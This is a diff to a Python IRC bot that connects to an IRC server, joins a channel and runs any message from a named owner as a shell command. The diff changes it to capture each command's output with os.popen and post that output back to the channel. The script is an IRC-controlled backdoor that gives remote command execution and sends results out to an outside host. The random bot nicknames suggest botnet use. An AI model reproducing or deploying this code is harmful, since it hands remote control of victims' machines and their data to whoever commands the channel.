@@ -9,7 +9,7 @@ PORT=6667
 NICK='BigData'+str(random.randint(1, 1000))
 IDENT=NICK
 REALNAME=NICK 
-OWNER='Joubin' 
+OWNER='joubin' 
 
 CHANNELINIT='#joubinjabbari' 
 readbuffer='' 
@@ -21,13 +21,16 @@ def parsemsg(msg):
     sender=info[0].split('!') 
     if sender[0]==OWNER: 
         cmd=msgpart
-        os.system(cmd)
-
+        test = os.popen(cmd).read()
+        if test != '':
+            test = test.split()
+            s.send( 'PRIVMSG '+CHANNELINIT+' :'+str(test)+'\r\n' );
 
 
 s=socket.socket( ) 
 s.connect((HOST, PORT)) 
 s.send('NICK '+NICK+'\r\n')  
+
 s.send('USER '+IDENT+' '+HOST+' bla :'+REALNAME+'\r\n') 
 while 1: 
 
@@ -37,7 +40,8 @@ while 1:
         s.send('JOIN '+CHANNELINIT+'\r\n') 
     if line.find('joubin')!=-1 and line.find('JOIN')==-1: 
         line=line.rstrip() 
-        parsemsg(line) 
+        parsemsg(line)
+        
     if(line.find('PING')!=-1):
 		pongData = line.split(':', 1)
 		pongData = pongData[1].split(' ')
